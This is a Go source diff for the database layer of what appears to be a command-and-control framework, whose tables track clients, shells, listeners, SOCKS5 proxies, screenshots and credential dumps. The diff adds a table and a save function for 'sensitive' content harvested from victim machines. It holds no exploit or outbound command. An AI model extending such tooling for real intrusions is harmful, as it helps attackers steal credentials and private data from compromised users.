@@ -7,6 +7,7 @@ import (
 	"os"
 	"path/filepath"
 	"reflect"
+	"time"
 
 	_ "modernc.org/sqlite"
 	"xorm.io/xorm"
@@ -122,6 +123,13 @@ type CredentialDumps struct {
 	FileSize  int64  `json:"fileSize"`
 	CreatedAt int64  `json:"createdAt"`
 }
+type SensitiveResults struct {
+	Id         int64  `xorm:"pk autoincr" json:"id"`
+	Uid        string `json:"uid"`
+	SearchPath string `json:"searchPath"`
+	Content    string `json:"content"`
+	CreatedAt  int64  `json:"createdAt"`
+}
 func generateInitialAdminPassword(length int) (string, error) {
 	if length <= 0 {
 		length = 20
@@ -160,7 +168,7 @@ func ConnectDateBase() {
 	if err != nil {
 		logger.Fatalf("连接sqlite数据库失败: %v", err)
 	}
-	err = Engine.Sync2(new(Users), new(Clients), new(Notes), new(Shell), new(Downloads), new(Listener), new(WebDelivery), new(Socks5), new(Settings), new(Key), new(Plugin), new(Screenshots), new(Credentials), new(CredentialDumps))
+	err = Engine.Sync2(new(Users), new(Clients), new(Notes), new(Shell), new(Downloads), new(Listener), new(WebDelivery), new(Socks5), new(Settings), new(Key), new(Plugin), new(Screenshots), new(Credentials), new(CredentialDumps), new(SensitiveResults))
 	if err != nil {
 		logger.Fatalf("初始化数据库失败: %v", err)
 	}
@@ -255,6 +263,14 @@ func InsertData(engine *xorm.Engine, table interface{}) error {
 
 	return nil
 }
+func SaveSensitiveChunk(uid string, data string) {
+	Engine.Insert(&SensitiveResults{
+		Uid:       uid,
+		Content:   data,
+		CreatedAt: time.Now().Unix(),
+	})
+}
+
 func ExecuteSQL(engine *xorm.Engine, sql string, args ...interface{}) error {
 	_, err := engine.Exec(sql, args)
 	if err != nil {
